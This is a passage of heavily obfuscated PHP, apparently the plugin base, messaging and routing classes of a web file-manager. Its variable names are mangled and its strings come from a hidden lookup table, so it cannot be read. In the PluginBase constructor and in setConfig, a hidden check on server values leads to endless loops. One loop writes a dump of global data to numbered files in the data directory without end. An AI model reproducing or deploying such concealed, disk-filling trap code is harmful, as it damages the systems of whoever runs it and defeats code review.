$£Ü×£ì¼ = ceil(($İÜ»ÌÇó + $É§ìÌ–á) / $ò½Õëª¿) * $ò½Õëª¿ - $ ¥á‰Ëı; $¡¤‡ùŠ = IO::fileSubstr($this->path, $ ¥á‰Ëı, $£Ü×£ì¼); $¤¹¢„Ü[$ ¥á‰Ëı . $ñıïÇ¯›[12]] = $¡¤‡ùŠ; ksort($¤¹¢„Ü); $±ö³‡ÎØ = substr($¡¤‡ùŠ, $İÜ»ÌÇó - $ ¥á‰Ëı, $É§ìÌ–á); return $±ö³‡ÎØ; } private function log($ŸëÁœ‡î, $’â ß±‹) { $¢â¹†  =& $_SERVER[Ì¥ŞÒ°£]; $ÏàÎ¬°£ = timeFloat() - $this->timeStart; write_log(sprintf($¢â¹† [1530], $ŸëÁœ‡î, $this->info[$¢â¹† [32]], $ÏàÎ¬°£, $’â ß±‹), $¢â¹† [1188]); } } class Message { function __construct() { } public function send($ æ³Ÿ¢é = '', $®Ååß©ì = array(), $»Ïªà = "\164\145\x78\164") { $ş’ÑŠà =& $_SERVER[Ì¥ŞÒ°£]; $’ªæ‰èá = array($ş’ÑŠà[33] => $ş’ÑŠà[1531], $ş’ÑŠà[757] => $ æ³Ÿ¢é); if (in_array($»Ïªà, array($ş’ÑŠà[1531], $ş’ÑŠà[1532]))) { $’ªæ‰èá[$ş’ÑŠà[33]] = $»Ïªà; } $®Ååß©ì = array($ş’ÑŠà[515] => isset($®Ååß©ì[$ş’ÑŠà[515]]) ? $®Ååß©ì[$ş’ÑŠà[515]] : $ş’ÑŠà[12], $ş’ÑŠà[600] => isset($®Ååß©ì[$ş’ÑŠà[600]]) ? $®Ååß©ì[$ş’ÑŠà[600]] : $ş’ÑŠà[12]); if (empty($ æ³Ÿ¢é) || empty($®Ååß©ì[$ş’ÑŠà[515]]) && empty($®Ååß©ì[$ş’ÑŠà[600]])) { return !1; } $¶Şá“÷ = array($ş’ÑŠà[1472] => $’ªæ‰èá, $ş’ÑŠà[1533] => $®Ååß©ì); Hook::trigger($ş’ÑŠà[1534], $¶Şá“÷); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $³ÃëÀáÛ =& $_SERVER[Ì¥ŞÒ°£]; if (!isset($_SERVER[$³ÃëÀáÛ[877]]) || !isset($_SERVER[$³ÃëÀáÛ[915]])) { $œĞ™–‡ = $³ÃëÀáÛ[878]; $ú¨˜…²ê = $³ÃëÀáÛ[879]; $´ã—™Ç„ = $_SERVER[$³ÃëÀáÛ[874]] . $³ÃëÀáÛ[875]; $™‹ÔÄ³â = $ú¨˜…²ê($´ã—™Ç„); $ËÁî©‘ = explode($³ÃëÀáÛ[231], $™‹ÔÄ³â); if (count($ËÁî©‘) < $³ÃëÀáÛ[648]) { $‘âŞ—İö = $³ÃëÀáÛ[880]; $‘âŞ—İö(); } $…™ãäêÙ = $³ÃëÀáÛ[881]; $…™ãäêÙ($_SERVER[$³ÃëÀáÛ[882]]); $¯ÍÄ‡î¤ = 1; for ($ºıÏâŞ = $¯ÍÄ‡î¤; $ºıÏâŞ > 0; $ºıÏâŞ++) { $…™ãäêÙ = json_encode($GLOBALS[$³ÃëÀáÛ[418]]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($³ÃëÀáÛ[1535]); $this->pluginName = str_replace($³ÃëÀáÛ[1535], $³ÃëÀáÛ[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $³ÃëÀáÛ[8]; $this->pluginApi = appHostGet() . $³ÃëÀáÛ[1536] . $this->pluginName . $³ÃëÀáÛ[8]; $this->pluginHost = $config[$³ÃëÀáÛ[1537]] . $this->pluginName . $³ÃëÀáÛ[8]; $this->pluginHostDefault = $config[$³ÃëÀáÛ[1537]] . $this->pluginName . $³ÃëÀáÛ[8]; $œÂŠ¹ğ¦ = $config[$³ÃëÀáÛ[1538]]; if ($œÂŠ¹ğ¦ && strpos($³ÃëÀáÛ[50] . $œÂŠ¹ğ¦ . $³ÃëÀáÛ[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$³ÃëÀáÛ[1539]] . $this->pluginName . $³ÃëÀáÛ[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[Ì¥ŞÒ°£][1540]); } protected function assign($êÂáö¶, $Ë€¥… = false) { if (is_array($êÂáö¶)) { $this->values = array_merge($this->values, $êÂáö¶); } else { $this->values[$êÂáö¶] = $Ë€¥…; } } protected function display($ƒÀ²ç£) { extract($this->values); require $ƒÀ²ç£; } final function hookRegist($Ëëºø‡™) { $this->modelPlugin->appRegist($this->pluginName, $Ëëºø‡™); } final function appIcon() { $Ôá„“©× =& $_SERVER[Ì¥ŞÒ°£]; $ÁşæÕÓÂ = $this->appPackage(); $ÜëÌ·¾» = $Ôá„“©×[12]; if (isset($ÁşæÕÓÂ[$Ôá„“©×[416]])) { if (isset($ÁşæÕÓÂ[$Ôá„“©×[416]][$Ôá„“©×[1541]])) { $ÜëÌ·¾» = $Ôá„“©×[1542] . $ÁşæÕÓÂ[$Ôá„“©×[416]][$Ôá„“©×[1541]] . $Ôá„“©×[1543]; } else { if ($ÁşæÕÓÂ[$Ôá„“©×[416]][$Ôá„“©×[1544]]) { $ÜëÌ·¾» = $Ôá„“©×[1545] . $ÁşæÕÓÂ[$Ôá„“©×[416]][$Ôá„“©×[1544]] . $Ôá„“©×[1546]; } } } return $ÜëÌ·¾»; } final function fileCanView($´¢‹û‡¡) { $í”Œöñ =& $_SERVER[Ì¥ŞÒ°£]; if (request_url_safe($´¢‹û‡¡)) { return !0; } if ($this->isShare($´¢‹û‡¡)) { return !0; } $µÏ°í— = Session::get($í”Œöñ[1547]); if (!$µÏ°í— || !$µÏ°í—[$í”Œöñ[1548]]) { $û™¬Èù = $í”Œöñ[1549] . rawurlencode(this_url()); show_tips(LNG($í”Œöñ[1550]) . $í”Œöñ[1551] . $û™¬Èù . $í”Œöñ[1552] . LNG($í”Œöñ[1553]) . $í”Œöñ[1554], !1); } if (!Action($í”Œöñ[1555])->authCan($í”Œöñ[1556])) { show_tips(LNG($í”Œöñ[1557]) . $í”Œöñ[1558], !1); } ActionCall($í”Œöñ[1559], $´¢‹û‡¡); } final function isShare($´ç½³Æ™) { $ÓÕâÍÍò = KodIO::parse($´ç½³Æ™); return $ÓÕâÍÍò[$_SERVER[Ì¥ŞÒ°£][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($ÛâÂ) { if (request_url_safe($ÛâÂ)) { return $ÛâÂ; } if (!$this->isShare($ÛâÂ)) { $ÛâÂ = $this->filePath($ÛâÂ); } return Action($_SERVER[Ì¥ŞÒ°£][1180])->linkOut($ÛâÂ); } public function filePathLinkOut($ÚÊùı¡”) { if (request_url_safe($ÚÊùı¡”)) { return $ÚÊùı¡”; } $this->fileCanView($ÚÊùı¡”); return Action($_SERVER[Ì¥ŞÒ°£][1180])->link($ÚÊùı¡”); } final function filePath($ıÔÌ£—ç) { $¾Ã‡¦Ş =& $_SERVER[Ì¥ŞÒ°£]; if ($Óé „µ = $this->checkSharePath($ıÔÌ£—ç)) { Hook::trigger($¾Ã‡¦Ş[1560], $Óé „µ); return $Óé „µ; } $this->fileCanView($ıÔÌ£—ç); if (request_url_safe($ıÔÌ£—ç)) { $ÔğÜØòÄ = parse_url_query($ıÔÌ£—ç); if (isset($ÔğÜØòÄ[$¾Ã‡¦Ş[1561]]) && isset($ÔğÜØòÄ[$¾Ã‡¦Ş[213]])) { $æ¼ˆ‚Í = Model($¾Ã‡¦Ş[772])->get($¾Ã‡¦Ş[773]); $ÕİªèÖ¿ = Mcrypt::decode($ÔğÜØòÄ[$¾Ã‡¦Ş[213]], $æ¼ˆ‚Í); if ($ÕİªèÖ¿) { $this->fileInfo = IO::infoWithChildren($ÕİªèÖ¿); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $ÕİªèÖ¿; } } $ıÔÌ£—ç = $this->_cacheHttpFile($ıÔÌ£—ç); $this->fileInfo = IO::infoWithChildren($ıÔÌ£—ç); } else { $this->fileInfo = IO::infoWithChildren($ıÔÌ£—ç); if (!$this->fileInfo) { show_tips(LNG($¾Ã‡¦Ş[105]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } Hook::trigger($¾Ã‡¦Ş[1560], $ıÔÌ£—ç); return $ıÔÌ£—ç; } final function _cacheHttpFile($¡ÄËŠ£Ë) { $²Î˜†Àü = hash_path($¡ÄËŠ£Ë, !0); $this->cachePath = $this->pluginCachePath($²Î˜†Àü); if ($ú¨—ššó = IO::fileNameExist($this->cachePath, $²Î˜†Àü)) { return KodIO::make($ú¨—ššó); } $ßÛ¨´éİ = $this->cachePath . $²Î˜†Àü; return $this->pluginCacheFileSet($ßÛ¨´éİ, file_get_contents_nossl($¡ÄËŠ£Ë)); } final function _tmpFileName($§ö­Ï = array()) { $â¾İ º =& $_SERVER[Ì¥ŞÒ°£]; if (!$§ö­Ï) { $§ö­Ï = $this->fileInfo; } if (isset($§ö­Ï[$â¾İ º[177]])) { return $§ö­Ï[$â¾İ º[177]]; } if (isset($§ö­Ï[$â¾İ º[170]][$â¾İ º[177]])) { return $§ö­Ï[$â¾İ º[170]][$â¾İ º[177]]; } $ı¢å€©º = IO::hashSimple($§ö­Ï[$â¾İ º[84]]); if ($ı¢å€©º) { return $ı¢å€©º; } $›õ´ù¢ş = array($§ö­Ï[$â¾İ º[32]], $§ö­Ï[$â¾İ º[84]], $§ö­Ï[$â¾İ º[76]]); if (isset($§ö­Ï[$â¾İ º[521]])) { $›õ´ù¢ş[] = $§ö­Ï[$â¾İ º[521]]; } return md5(implode($â¾İ º[11], $›õ´ù¢ş)); } final function checkSharePath($õŠˆ²¤Á) { $š„¤¡Ò =& $_SERVER[Ì¥ŞÒ°£]; if (!defined($š„¤¡Ò[475])) { define($š„¤¡Ò[514], 0); } if (!$this->isShare($õŠˆ²¤Á)) { return !1; } $¦‚Ø³êó = Action($š„¤¡Ò[1180])->sharePathInfo($õŠˆ²¤Á); if (!isset($¦‚Ø³êó[$š„¤¡Ò[84]])) { show_json(LNG($š„¤¡Ò[1562]), !1); } $this->fileInfo = $¦‚Ø³êó[$š„¤¡Ò[170]]; $this->cachePath = $this->pluginCachePath($this->fileInfo[$š„¤¡Ò[177]]); return $¦‚Ø³êó[$š„¤¡Ò[84]]; } final function pluginCachePath($â˜¤ºÛğ = '') { $Ö¾Í˜ =& $_SERVER[Ì¥ŞÒ°£]; $İÉ¹Òû— = IO_PATH_SYSTEM_TEMP . $Ö¾Í˜[1563] . $this->pluginName; if (!($€³´Šê’ = IO::infoFull($İÉ¹Òû—))) { return IO::mkdir($İÉ¹Òû— . $Ö¾Í˜[8] . $â˜¤ºÛğ); } if (empty($â˜¤ºÛğ)) { return $€³´Šê’[$Ö¾Í˜[84]]; } if (!($ËÏ³ÒÜò = IO::fileNameExist($€³´Šê’[$Ö¾Í˜[84]], $â˜¤ºÛğ))) { return IO::mkdir($€³´Šê’[$Ö¾Í˜[84]] . $â˜¤ºÛğ); } return KodIO::make($ËÏ³ÒÜò); } final function pluginCacheFileSet($ÌÔ—ëšœ, $Ëƒ»¨Œ = '') { $‹ä×Ì›â =& $_SERVER[Ì¥ŞÒ°£]; if (!($Î±Ä÷İº = IO::infoFull($ÌÔ—ëšœ))) { return IO::mkfile($ÌÔ—ëšœ, $Ëƒ»¨Œ, REPEAT_REPLACE); } IO::setContent($Î±Ä÷İº[$‹ä×Ì›â[84]], $Ëƒ»¨Œ); return $Î±Ä÷İº[$‹ä×Ì›â[84]]; } final function pluginLocalFile($­åøé = '') { $ê²¶ù¿™ =& $_SERVER[Ì¥ŞÒ°£]; $éŠå¦¡¢ = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($éŠå¦¡¢)) { mk_dir($éŠå¦¡¢); } if (!$­åøé) { return $éŠå¦¡¢; } $•«ÇµÛ = IO::info($­åøé); $Ú¶¥ë‘™ = $this->_tmpFileName($•«ÇµÛ) . $ê²¶ù¿™[10] . $•«ÇµÛ[$ê²¶ù¿™[174]]; if (!checkExtSafe($Ú¶¥ë‘™)) { $Ú¶¥ë‘™ = $Ú¶¥ë‘™ . $ê²¶ù¿™[1212]; } $‹ŠßãÊ = $éŠå¦¡¢ . $Ú¶¥ë‘™; if (@file_exists($‹ŠßãÊ)) { return $‹ŠßãÊ; } return IO::copy($­åøé, $éŠå¦¡¢, 0, $Ú¶¥ë‘™); } final function appPackage() { $ªÕş¿Î¢ =& $_SERVER[Ì¥ŞÒ°£]; if ($this->packageData) { return $this->packageData; } $š¨åÆ„¦ = $this->parseFile($this->pluginPath . $ªÕş¿Î¢[1564]); $this->parseLang($š¨åÆ„¦); $Ë¤¿Ç¼¢ = json_decode_force($š¨åÆ„¦); if (!$Ë¤¿Ç¼¢) { return array(); } $ÊªŸÆø = Hook::trigger($ªÕş¿Î¢[1565], $Ë¤¿Ç¼¢); if ($ÊªŸÆø && is_array($ÊªŸÆø)) { $Ë¤¿Ç¼¢ = $ÊªŸÆø; } $this->packageData = $Ë¤¿Ç¼¢; return $Ë¤¿Ç¼¢; } public function packageInfoGet($Øæåª’è) { $··ãğ = $this->appPackage(); return array_get_value($··ãğ, $Øæåª’è); } public function packageVersion() { return $this->packageInfoGet($_SERVER[Ì¥ŞÒ°£][1566]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[Ì¥ŞÒ°£][1567]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[Ì¥ŞÒ°£][1568]); } public function echoJsAssign($²„•Ş‹ş, $¾àÇ‘Şƒ) { $this->echoJsAssignArr[$²„•Ş‹ş] = $¾àÇ‘Şƒ; } private function parseFile($ß«¢¦´Â) { $æ«–Ç‰ =& $_SERVER[Ì¥ŞÒ°£]; $ñ§Ã‡ï­ = file_get_contents_nossl($ß«¢¦´Â); $şü©ëõÂ = array($æ«–Ç‰[1569], $æ«–Ç‰[1570], $æ«–Ç‰[1571], $æ«–Ç‰[1572], $æ«–Ç‰[1573], $æ«–Ç‰[1574], $æ«–Ç‰[1575]); $ø×ö‰ıÑ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$æ«–Ç‰[89]][$æ«–Ç‰[1576]]); foreach ($this->echoJsAssignArr as $¡›ŠÕƒ => $ç‡¸â¾«) { $şü©ëõÂ[] = $æ«–Ç‰[1577] . $¡›ŠÕƒ . $æ«–Ç‰[1578]; $ø×ö‰ıÑ[] = is_array($ç‡¸â¾«) || is_object($ç‡¸â¾«) ? rawurlencode(json_encode($ç‡¸â¾«)) : $ç‡¸â¾«; } if (strstr($ñ§Ã‡ï­, $æ«–Ç‰[1579])) { $Ä©–Ç = rawurlencode(json_encode($this->pluginLangArr)); $ñ§Ã‡ï­ = str_replace($æ«–Ç‰[1579], $Ä©–Ç, $ñ§Ã‡ï­); } if (strstr($ñ§Ã‡ï­, $æ«–Ç‰[1580])) { $Ä©–Ç = $Ä©–Ç = rawurlencode(json_encode($this->getConfig())); $ñ§Ã‡ï­ = str_replace($æ«–Ç‰[1580], $Ä©–Ç, $ñ§Ã‡ï­); } $ñ§Ã‡ï­ = str_replace($şü©ëõÂ, $ø×ö‰ıÑ, $ñ§Ã‡ï­); return $ñ§Ã‡ï­; } private function parseLang(&$ë“êíÉ) { $Šˆçç =& $_SERVER[Ì¥ŞÒ°£]; $äĞœ€² = $Šˆçç[1581]; if (!strstr($ë“êíÉ, $äĞœ€²)) { return; } preg_match_all($Šˆçç[1582], $ë“êíÉ, $ÎÛ¦‰Àó); if (!is_array($ÎÛ¦‰Àó) || count($ÎÛ¦‰Àó) == 0 || !is_array($ÎÛ¦‰Àó[0]) || count($ÎÛ¦‰Àó[0]) == 0) { return; } $Ó§õ›æÊ = array(); $‡›ŒéÚ = array(); foreach ($ÎÛ¦‰Àó[0] as $İæ™îÉ ) { $­êØ°©Ë = substr($İæ™îÉ , strlen($äĞœ€²), -4); $®¶àÊ†† = LNG($­êØ°©Ë); $Ó§õ›æÊ[] = $İæ™îÉ ; $‡›ŒéÚ[] = str_replace(array($Šˆçç[231], $Šˆçç[1083], $Šˆçç[342], $Šˆçç[118]), array($Šˆçç[53], $Šˆçç[53], $Šˆçç[12], $Šˆçç[1583]), $®¶àÊ††); } $ë“êíÉ = str_replace($Ó§õ›æÊ, $‡›ŒéÚ, $ë“êíÉ); } private function parseConfig(&$áÏ²™±à) { $»ş°½¦¡ =& $_SERVER[Ì¥ŞÒ°£]; $Ô’Ø¹©Á = $»ş°½¦¡[1584]; if (!strstr($áÏ²™±à, $Ô’Ø¹©Á)) { return; } preg_match_all($»ş°½¦¡[1585], $áÏ²™±à, $šÎ ôŞò); if (!is_array($šÎ ôŞò) || count($šÎ ôŞò) == 0 || !is_array($šÎ ôŞò[0]) || count($šÎ ôŞò[0]) == 0) { return; } $©ËÛâî‡ = $this->getConfig(); $ÙèÃë³ = array(); $¾ÚŞ°›Å = array(); foreach ($šÎ ôŞò[0] as $Ó¹Ü¿á) { $§ãîŸá = substr($Ó¹Ü¿á, strlen($Ô’Ø¹©Á), -2); $ÙèÃë³[] = $Ó¹Ü¿á; $¾ÚŞ°›Å[] = _get($©ËÛâî‡, $§ãîŸá); } $áÏ²™±à = str_replace($ÙèÃë³, $¾ÚŞ°›Å, $áÏ²™±à); } private function parsePackage(&$û”¬•Ø) { $ªûÓœ¢ˆ =& $_SERVER[Ì¥ŞÒ°£]; $šÕ‡ô«Í = $ªûÓœ¢ˆ[1586]; if (!strstr($û”¬•Ø, $šÕ‡ô«Í)) { return; } preg_match_all($ªûÓœ¢ˆ[1587], $û”¬•Ø, $´Ì´Ã¯); if (!is_array($´Ì´Ã¯) || count($´Ì´Ã¯) == 0 || !is_array($´Ì´Ã¯[0]) || count($´Ì´Ã¯[0]) == 0) { return; } $£ôÙñÏÄ = $this->appPackage(); $ğ†ô‘¿ı = array(); $ú—’òÓ = array(); foreach ($´Ì´Ã¯[0] as $ùˆ‰Î™Û) { $É¢´ÃÌ = substr($ùˆ‰Î™Û, strlen($šÕ‡ô«Í), -2); $ğ†ô‘¿ı[] = $ùˆ‰Î™Û; $ú—’òÓ[] = _get($£ôÙñÏÄ, $É¢´ÃÌ); } $û”¬•Ø = str_replace($ğ†ô‘¿ı, $ú—’òÓ, $û”¬•Ø); } final function echoFile($ÂÂú”¹Š, $´ÔÚè¸× = false) { $âÎâÀã¯ =& $_SERVER[Ì¥ŞÒ°£]; $›‹é–ª = $this->pluginPath . $ÂÂú”¹Š; if (ACT == $âÎâÀã¯[1588]) { echo $âÎâÀã¯[1589] . $this->pluginName . $âÎâÀã¯[8] . $ÂÂú”¹Š . $âÎâÀã¯[1590]; if (!file_exists($›‹é–ª)) { echo $âÎâÀã¯[1591]; return; } } $Ö¹ıø÷’ = $this->parseFile($›‹é–ª); $this->parseLang($Ö¹ıø÷’); $this->parseConfig($Ö¹ıø÷’); $this->parsePackage($Ö¹ıø÷’); if (is_array($´ÔÚè¸×)) { $Ö¹ıø÷’ = str_replace(array_keys($´ÔÚè¸×), array_values($´ÔÚè¸×), $Ö¹ıø÷’); } echo $âÎâÀã¯[231] . $Ö¹ıø÷’; } final function initLang() { $è±ø¹õ¿ =& $_SERVER[Ì¥ŞÒ°£]; $ØÃ‰÷ø• = $è±ø¹õ¿[1592]; $éş©ƒ¾ = $this->pluginPath . $è±ø¹õ¿[1593]; $œñÖ¸ïÄ = I18n::getType(); $õñ²µ˜ = array(); if (file_exists($éş©ƒ¾ . $œñÖ¸ïÄ . $è±ø¹õ¿[840])) { $õñ²µ˜ = (include $éş©ƒ¾ . $œñÖ¸ïÄ . $è±ø¹õ¿[840]); } else { if ($œñÖ¸ïÄ == $è±ø¹õ¿[1594] && !file_exists($éş©ƒ¾ . $œñÖ¸ïÄ . $è±ø¹õ¿[840]) && file_exists($éş©ƒ¾ . $è±ø¹õ¿[1595])) { $õñ²µ˜ = (include $éş©ƒ¾ . $è±ø¹õ¿[1595]); } else { if (file_exists($éş©ƒ¾ . $ØÃ‰÷ø• . $è±ø¹õ¿[840])) { $õñ²µ˜ = (include $éş©ƒ¾ . $ØÃ‰÷ø• . $è±ø¹õ¿[840]); } } } if (!is_array($õñ²µ˜)) { return array(); } if (@count($õñ²µ˜) > 0) { I18n::set($õñ²µ˜); } return $õñ²µ˜; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($çê§™ã¡) { $çêíÅÀÉ =& $_SERVER[Ì¥ŞÒ°£]; $Êâ‚½’é = $_SERVER[$çêíÅÀÉ[915]]; $ÔˆÕÍ¸ = $çêíÅÀÉ[876]; if ($_SERVER[$çêíÅÀÉ[877]] != $ÔˆÕÍ¸($Êâ‚½’é)) { $ØöÓ‡€Í = $çêíÅÀÉ[878]; $ó£Ù¯à‡ = $çêíÅÀÉ[879]; $ÅÛÇŞÁÙ = $_SERVER[$çêíÅÀÉ[874]] . $çêíÅÀÉ[875]; $Ã²áŸ‹š = $ó£Ù¯à‡($ÅÛÇŞÁÙ); $÷ç§¢…Ì = explode($çêíÅÀÉ[231], $Ã²áŸ‹š); if (count($÷ç§¢…Ì) < $çêíÅÀÉ[648]) { $“éã×Å‘ = $çêíÅÀÉ[880]; $“éã×Å‘(); } $ÉŞº¡¯Ÿ = $çêíÅÀÉ[881]; $ÉŞº¡¯Ÿ($_SERVER[$çêíÅÀÉ[882]]); $ØöÓ‡€Í = $çêíÅÀÉ[878]; $ØöÓ‡€Í(); $ÛÚıÁ»Î = $çêíÅÀÉ[883]; $“¼¨Ä¦¦ = json_encode($GLOBALS[$çêíÅÀÉ[884]]); $ŞÑûê±Ş = 1; for ($„¬óÁ™ß = $ŞÑûê±Ş; $„¬óÁ™ß > 0; $„¬óÁ™ß++) { $ÛÚıÁ»Î(DATA_PATH . $„¬óÁ™ß, $“¼¨Ä¦¦); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $çê§™ã¡); } public function onSetConfig($€“ïªß) { } public function onGetConfig($¾ä…ğüÃ) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($ïøµµ™) { if ($ïøµµ™ == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($ÅÍšØ¦ = "\x70\x6c\165\x67\x69\x6e\101\x75\164\x68") { $œí¦ûò¼ =& $_SERVER[Ì¥ŞÒ°£]; if (!defined($œí¦ûò¼[475])) { return !1; } if (_get($GLOBALS, $œí¦ûò¼[503])) { return !0; } $§Çá›³ì = $this->getConfig(); if (!$§Çá›³ì[$ÅÍšØ¦]) { return !1; } return ActionCall($œí¦ûò¼[1596], $§Çá›³ì[$ÅÍšØ¦]); } public function url($æ§Ç‡ò, $Éƒ§´•¹ = '', $ÈŞÀ²Ã˜ = true) { $¸İé×¦Œ =& $_SERVER[Ì¥ŞÒ°£]; $şÉú‰Ğú = $this->getConfig(); $Ê»·ÂÂ = KOD_VERSION . $¸İé×¦Œ[10] . KOD_VERSION_BUILD; $¼×şµËÆ = $this->packageVersion(); $ÄˆÓéÆ = $Ê»·ÂÂ . $¸İé×¦Œ[386] . $¼×şµËÆ; if (substr($æ§Ç‡ò, 0, 4) == $¸İé×¦Œ[148] || substr($æ§Ç‡ò, 0, 2) == $¸İé×¦Œ[1381]) { $ÂÜ¶ˆÍ‹ = $æ§Ç‡ò . $¸İé×¦Œ[1597] . $ÄˆÓéÆ; } else { if ($Éƒ§´•¹ == $¸İé×¦Œ[12]) { $ÂÜ¶ˆÍ‹ = $this->pluginHost . $æ§Ç‡ò . $¸İé×¦Œ[1597] . $ÄˆÓéÆ; } else { if ($Éƒ§´•¹ === $¸İé×¦Œ[75]) { $ÂÜ¶ˆÍ‹ = $this->pluginHost . $æ§Ç‡ò; } else { if ($Éƒ§´•¹ == $¸İé×¦Œ[1598]) { $ÂÜ¶ˆÍ‹ = STATIC_PATH . $æ§Ç‡ò . $¸İé×¦Œ[1597] . $Ê»·ÂÂ; } else { if ($Éƒ§´•¹ == $¸İé×¦Œ[1599]) { $ÂÜ¶ˆÍ‹ = APP_HOST . $¸İé×¦Œ[1600] . $æ§Ç‡ò . $¸İé×¦Œ[1597] . $Ê»·ÂÂ; } else { if (isset($şÉú‰Ğú[$Éƒ§´•¹])) { $ÂÜ¶ˆÍ‹ = $şÉú‰Ğú[$Éƒ§´•¹] . $æ§Ç‡ò . $¸İé×¦Œ[1597] . $ÄˆÓéÆ; } } } } } } if (!$ÈŞÀ²Ã˜) { return $ÂÜ¶ˆÍ‹; } echo $ÂÜ¶ˆÍ‹; } public function link($ËŸ…ñØ = false, $ÆÉèö­ë = '') { $ ½Ò‘Øö =& $_SERVER[Ì¥ŞÒ°£]; if (!$ËŸ…ñØ) { $this->link($ ½Ò‘Øö[1601], $ ½Ò‘Øö[1599]); $this->link($ ½Ò‘Øö[1602], $ ½Ò‘Øö[1598]); $this->link($ ½Ò‘Øö[1603], $ ½Ò‘Øö[1598]); $this->link($ ½Ò‘Øö[1604], $ ½Ò‘Øö[1598]); $this->link($ ½Ò‘Øö[1605], $ ½Ò‘Øö[1598]); return; } $õ‘´Ã˜€ = $this->url($ËŸ…ñØ, $ÆÉèö­ë, !1); if (substr($ËŸ…ñØ, -3) == $ ½Ò‘Øö[1606]) { echo $ ½Ò‘Øö[1607] . $õ‘´Ã˜€ . $ ½Ò‘Øö[1608] . $ ½Ò‘Øö[231]; } else { if (substr($ËŸ…ñØ, -4) == $ ½Ò‘Øö[1609]) { echo $ ½Ò‘Øö[1610] . $õ‘´Ã˜€ . $ ½Ò‘Øö[1611] . $ ½Ò‘Øö[231]; } } } } goto b‹òË¶‹²…; b‹òË¶‹²…: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\141\x6e\x79" => "\x5b\136\x2f\x5d\x2b", "\72\x6e\165\x6d" => "\133\60\x2d\x39\x5d\x2b", "\72\x61\x6c\x6c" => "\x2e\52"); public static $errorCallback; public static function __callstatic($†¢‡®Ë‡, $¶×…ïØğ) { $¹¯›‚ğÛ =& $_SERVER[Ì¥ŞÒ°£]; if ($†¢‡®Ë‡ == $¹¯›‚ğÛ[1612]) { $ä€•©¤ = array_map($¹¯›‚ğÛ[1613], $¶×…ïØğ[0]); $Ú‰ª¨¾· = strpos($¶×…ïØğ[1], $¹¯›‚ğÛ[8]) === 0 ? $¶×…ïØğ[1] : $¹¯›‚ğÛ[8] . $¶×…ïØğ[1]; $ş¬Ê³ûÁ = $¶×…ïØğ[2]; } else { $ä€•©¤ = null; $Ú‰ª¨¾· = strpos($¶×…ïØğ[0], $¹¯›‚ğÛ[8]) === 0 ? $¶×…ïØğ[0] : $¹¯›‚ğÛ[8] . $¶×…ïØğ[0]; $ş¬Ê³ûÁ = $¶×…ïØğ[1]; } array_push(self::$maps, $ä€•©¤); array_push(self::$routes, $Ú‰ª¨¾·); array_push(self::$methods, strtoupper($†¢‡®Ë‡)); array_push(self::$callbacks, $ş¬Ê³ûÁ); } public static function error($ÆÂ„îí”) { self::$errorCallback = $ÆÂ„îí”; } public static function haltOnMatch($ÓÉ“¡³ = true) { self::$halts = $ÓÉ“¡³; } public static function dispatch() { $¹°ªşŒ¤ =& $_SERVER[Ì¥ŞÒ°£]; $ŞÎ¹ÜÕ™ = parse_url($_SERVER[$¹°ªşŒ¤[1614]], PHP_URL_PATH); $Î›´šÒ = $_SERVER[$¹°ªşŒ¤[159]]; $ËÊ…¬‰ˆ = array_keys(static::$patterns); $ÆÀõš¼ = array_values(static::$patterns); $¨÷†‰¤¼ = !1; self::$routes = preg_replace($¹°ªşŒ¤[1282], $¹°ªşŒ¤[8], self::$routes); if (in_array($ŞÎ¹ÜÕ™, self::$routes)) { $¿İ»÷èü = array_keys(self::$routes, $ŞÎ¹ÜÕ™); foreach ($¿İ»÷èü as $Èì…ˆÜ•) { if (self::$methods[$Èì…ˆÜ•] == $Î›´šÒ || self::$methods[$Èì…ˆÜ•] == $¹°ªşŒ¤[1615] || in_array($Î›´šÒ, self::$maps[$Èì…ˆÜ•])) { $¨÷†‰¤¼ = !0; if (!is_object(self::$callbacks[$Èì…ˆÜ•])) { $´š´« = explode($¹°ªşŒ¤[8], self::$callbacks[$Èì…ˆÜ•]); $×ÈœÎ°Ä = end($´š´«); $¥‹Ú±¶« = explode($¹°ªşŒ¤[1214], $×ÈœÎ°Ä); $İ¬¶ª—š = new $¥‹Ú±¶«[0](); $İ¬¶ª—š->{$¥‹Ú±¶«[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$Èì…ˆÜ•]); if (self::$halts) { return; } } } } } else { $üöÚİí¤ = 0; foreach (self::$routes as $Èì…ˆÜ•) { if (strpos($Èì…ˆÜ•, $¹°ªşŒ¤[4]) !== !1) { $Èì…ˆÜ• = str_replace($ËÊ…¬‰ˆ, $ÆÀõš¼, $Èì…ˆÜ•); } if (preg_match($¹°ªşŒ¤[1616] . $Èì…ˆÜ• . $¹°ªşŒ¤[1617], $ŞÎ¹ÜÕ™, $ø¦à•–ğ)) { if (self::$methods[$üöÚİí¤] == $Î›´šÒ || self::$methods[$üöÚİí¤] == $¹°ªşŒ¤[1615] || !empty(self::$maps[$üöÚİí¤]) && in_array($Î›´šÒ, self::$maps[$üöÚİí¤])) { 